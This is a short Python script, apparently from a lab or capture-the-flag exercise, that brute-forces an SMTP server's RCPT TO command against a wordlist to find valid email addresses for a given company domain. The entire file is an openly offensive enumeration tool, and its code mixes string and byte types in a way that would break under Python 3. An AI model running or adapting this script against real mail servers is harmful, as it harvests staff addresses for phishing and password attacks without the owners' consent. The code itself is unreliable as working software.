import telnetlib
from time import sleep
import sys

def init_connection():
	tn = telnetlib.Telnet('10.10.10.10',25)
	tn.read_until(b"220 m***a ESMTP")
	tn.write('HELO m***a'.encode("ascii")+b'\n')
	tn.read_until(b"250 dev.m***a")
	tn.write('MAIL FROM:<mail@example.com>'.encode("ascii")+b'\n')
	tn.read_until(b"250 2.1.0 Ok")
	return tn

if len(sys.argv) < 3:
	print ('./run.py [wordlist] [company domain]')
	sys.exit()
company_domain = sys.argv[2]
tn = init_connection()
tn.read_until('\n')
f = open(sys.argv[1])
print ("Ready to brute!")

for x in f:
	try:
		print ("Testing " + x[:-1] +'@' + company_domain)
		tn.write('RCPT TO:<'.encode("ascii")+x[:-1].encode("ascii")+'@'+company_domain.encode("ascii")+b'>\n')
		reply = tn.read_until("\n")
		if "Ok" in reply:
			print ("---------------Valid!------------------")
	except:
		print ("Oops. Connection reset. Retrying!")
		tn = init_connection()
		tn.read_until('\n')
		tn.write('RCPT TO:<'.encode("ascii")+x[:-1].encode("ascii")+'@'+company_domain.encode("ascii")+b'>\n')
		print ("Testing " + x[:-1] +'@' + company_domain)
		reply = tn.read_until("\n")
		if "Ok" in reply:
                        print ("--------------Valid!------------------")

